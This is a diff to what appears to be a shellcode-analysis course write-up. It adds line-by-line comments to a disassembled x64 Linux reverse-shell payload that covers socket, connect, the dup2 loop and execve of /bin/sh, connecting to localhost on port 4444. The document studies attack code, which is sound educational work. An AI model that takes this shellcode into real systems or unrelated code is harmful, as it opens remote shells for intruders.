@@ -178,7 +178,7 @@ whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect2$ echo -ne "\x6A\x
 0000002E  4897              xchg rax,rdi                      ; Exchanges the value between RAX and RDI. This is done in order to satisfy further sockfd arguments.
 00000030  6A03              push byte +0x3                    ; Pushes value 3 into the stack.
 00000032  5E                pop rsi                           ; Pops this value into RSI.
-00000033  48FFCE            dec rsi                           ; Decrements RSI
+00000033  48FFCE            dec rsi                           ; Decrements RSI.
 00000036  6A21              push byte +0x21                   ; Pushes syscall value 33 (value of the dup2 syscall) into the stack.  
 00000038  58                pop rax                           ; Pops this value into RAX.
 00000039  0F05              syscall                           ; Executes the syscall.
@@ -242,24 +242,24 @@ root@whitecr0wz:~# echo -ne "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x4
 0000001F  6A2A              push byte +0x2a                   ; Pushes syscall value 42 (value of the socket connect) into the stack.
 00000021  58                pop rax                           ; Pops this value into RAX.
 00000022  0F05              syscall                           ; Executes the syscall.
-00000024  6A03              push byte +0x3
-00000026  5E                pop rsi
-00000027  48FFCE            dec rsi
-0000002A  6A21              push byte +0x21
-0000002C  58                pop rax
-0000002D  0F05              syscall
-0000002F  75F6              jnz 0x27
-00000031  6A3B              push byte +0x3b
-00000033  58                pop rax
-00000034  99                cdq
-00000035  48BB2F62696E2F73  mov rbx,0x68732f6e69622f
+00000024  6A03              push byte +0x3                    ; The value 3 is pushed into the stack.
+00000026  5E                pop rsi                           ; Pops this value into RSI.
+00000027  48FFCE            dec rsi                           ; Decrements RSI.
+0000002A  6A21              push byte +0x21                   ; Pushes syscall value 33 (value of the socket dup2) into the stack.
+0000002C  58                pop rax                           ; Pops this value into RAX.
+0000002D  0F05              syscall                           ; Executes the syscall.
+0000002F  75F6              jnz 0x27                          ; Jump if the Zero flag (ZF) hasn't been set. This means that until RSI doesn't hit zero (through the dec rsi instruction), the loop will not stop.
+00000031  6A3B              push byte +0x3b                   ; Pushes syscall value 59 (value of the execve syscall) into the stack.
+00000033  58                pop rax                           ; Pops this value into RAX.
+00000034  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
+00000035  48BB2F62696E2F73  mov rbx,0x68732f6e69622f          ; Moves value "/bin/sh" into RBX.
          -6800
-0000003F  53                push rbx
-00000040  4889E7            mov rdi,rsp
-00000043  52                push rdx
-00000044  57                push rdi
-00000045  4889E6            mov rsi,rsp
-00000048  0F05              syscall
+0000003F  53                push rbx                          ; Pushes the RBX into the stack.
+00000040  4889E7            mov rdi,rsp                       ; The value of RSP is copied into RDI.
+00000043  52                push rdx                          ; RDX is pushed. It is most likely that this is simply a NULL-DWORD.
+00000044  57                push rdi                          ; RDI (/bin/sh) is pushed into the stack.
+00000045  4889E6            mov rsi,rsp                       ; The value of RSP is copied into RSI.
+00000048  0F05              syscall                           ; Executes the syscall.
 ```
 
 Once again, there isn't much to comment, as most of the important explanation has been done through the comments. It simply is a reverse-shell that arranges a connection towards the local address in port 4444.
